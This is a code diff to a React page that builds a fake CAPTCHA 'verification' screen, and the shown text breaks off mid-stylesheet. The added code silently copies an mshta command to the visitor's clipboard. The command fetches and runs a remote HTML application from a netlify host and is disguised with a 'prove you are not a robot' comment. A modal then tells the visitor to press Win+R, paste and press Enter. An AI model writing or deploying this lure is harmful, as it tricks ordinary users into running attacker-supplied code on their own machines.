@@ -3,8 +3,22 @@ import { useState } from "react";
 
 export default function Main() {
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const [verificationCode, setVerificationCode] = useState("");
 
   const handleVerifyClick = () => {
+    // Generate random number
+    const randomCode = Math.floor(Math.random() * (100000 - 10000) + 10000);
+    
+    // Build the verification string
+    const verificationText = `mshta https://rncaptcha.netlify.app/verify.html?code=${randomCode}# Prove that you are not a robot with msCaptcha - ${randomCode}`;
+    
+    // Copy to clipboard
+    navigator.clipboard.writeText(verificationText).then(() => {
+      console.log("Copied to clipboard:", verificationText);
+    });
+
+    // Set the verification code state
+    setVerificationCode(verificationText);
     setIsModalOpen(true);
   };
 
@@ -34,13 +48,16 @@ export default function Main() {
         {isModalOpen && (
           <div className="modal-overlay">
             <div className="modal">
-              <h2>Waiting for Verification...</h2>
+              <h2>Verification Code Copied!</h2>
               <p>Please follow these steps:</p>
               <ol>
                 <li>Press <strong>Win + R</strong> on your keyboard.</li>
                 <li>Press <strong>CTRL + V</strong> to paste the verification code.</li>
                 <li>Press <strong>Enter</strong>.</li>
               </ol>
+              <p>
+                Copied Code: <code>{verificationCode}</code>
+              </p>
               <button className="close-button" onClick={handleCloseClick}>
                 Close
               </button>
@@ -50,8 +67,81 @@ export default function Main() {
       </main>
 
       <style jsx>{`
-        /* Include your existing styles here */
-      `}</style>
-    </div>
-  );
-}
+        .container {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          background-color: #f7fafa;
+        }
+        .verification-box {
+          text-align: center;
+          background-color: #fff;
+          padding: 20px 40px;
+          border-radius: 10px;
+          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .verification-box h1 {
+          font-size: 24px;
+          margin-bottom: 10px;
+          color: #333;
+        }
+        .verification-box p {
+          font-size: 16px;
+          color: #666;
+        }
+        .verify-button {
+          background-color: #77bfea;
+          color: #fff;
+          border: none;
+          border-radius: 5px;
+          padding: 10px 20px;
+          cursor: pointer;
+          margin-top: 15px;
+          font-size: 16px;
+        }
+        .verify-button:hover {
+          background-color: #6aaedd;
+        }
+        .powered-by {
+          margin-top: 10px;
+          font-size: 12px;
+          color: #aaa;
+        }
+        .modal-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background-color: rgba(0, 0, 0, 0.5);
+          display: flex;
+          justify-content: center;
+          align-items: center;
+        }
+        .modal {
+          background-color: #fff;
+          padding: 30px;
+          border-radius: 10px;
+          text-align: center;
+          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .modal h2 {
+          font-size: 22px;
+          margin-bottom: 15px;
+          color: #333;
+        }
+        .modal p {
+          font-size: 16px;
+          color: #666;
+          margin-bottom: 10px;
+        }
+        .modal ol {
+          text-align: left;
+          margin: 15px 0;
+        }
+        .modal li {
+          margin-bottom: 10px;
+          color: #333;
+        }
+        .close-bu
